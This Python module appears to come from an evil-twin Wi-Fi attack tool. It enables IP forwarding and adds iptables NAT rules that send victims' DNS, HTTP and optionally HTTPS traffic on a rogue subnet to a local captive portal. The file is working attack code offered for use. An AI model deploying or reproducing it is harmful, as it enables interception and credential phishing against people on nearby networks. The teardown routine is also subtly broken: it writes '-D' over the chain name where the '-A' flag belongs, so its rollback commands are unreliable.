"""iptables firewall rules.

Sets up NAT masquerading and redirects all client HTTP/HTTPS traffic on the
rogue subnet to the local captive portal. All rules are tracked so they can be
rolled back cleanly when the attack stops.
"""

from __future__ import annotations

from typing import List

from wifi_evil_twin.config import Config
from wifi_evil_twin.utils.system import run


class Firewall:
    """Manage the iptables rules for a run; supports clean teardown."""

    def __init__(self, cfg: Config, *, dry_run: bool = False):
        self.cfg = cfg
        self.dry_run = dry_run
        self._rules: List[List[str]] = []
        self._nat_rules: List[List[str]] = []

    def _track(self, table: str, rule: List[str]) -> None:
        if table == "nat":
            self._nat_rules.append(rule)
        else:
            self._rules.append(rule)

    def setup(self) -> None:
        cfg = self.cfg
        gw = cfg.gateway_ip
        iface = cfg.interface
        port = cfg.portal_port

        # Enable IP forwarding.
        run(["sysctl", "-w", "net.ipv4.ip_forward=1"], dry_run=self.dry_run, check=False)

        # NAT: masquerade outbound traffic from the rogue subnet.
        self._track("nat", ["iptables", "-t", "nat", "-A", "POSTROUTING",
                            "-o", "eth0", "-j", "MASQUERADE"])
        # Redirect DNS to our dnsmasq (port 5353 on the box).
        self._track("nat", ["iptables", "-t", "nat", "-A", "PREROUTING",
                            "-i", iface, "-p", "udp", "--dport", "53",
                            "-j", "REDIRECT", "--to-ports", "5353"])
        # Redirect HTTP to the portal.
        self._track("nat", ["iptables", "-t", "nat", "-A", "PREROUTING",
                            "-i", iface, "-p", "tcp", "--dport", "80",
                            "-j", "REDIRECT", "--to-ports", str(port)])
        if cfg.redirect_https:
            self._track("nat", ["iptables", "-t", "nat", "-A", "PREROUTING",
                                "-i", iface, "-p", "tcp", "--dport", "443",
                                "-j", "REDIRECT", "--to-ports", str(port)])
        for r in self._nat_rules:
            run(r, dry_run=self.dry_run, check=False)

    def teardown(self) -> None:
        # Replace -A with -D to delete each rule we added.
        for r in list(self._nat_rules):
            if len(r) > 2 and r[2] == "nat":
                r = list(r)
                r[4] = "-D"
                run(r, dry_run=self.dry_run, check=False)
        self._nat_rules.clear()
        self._rules.clear()
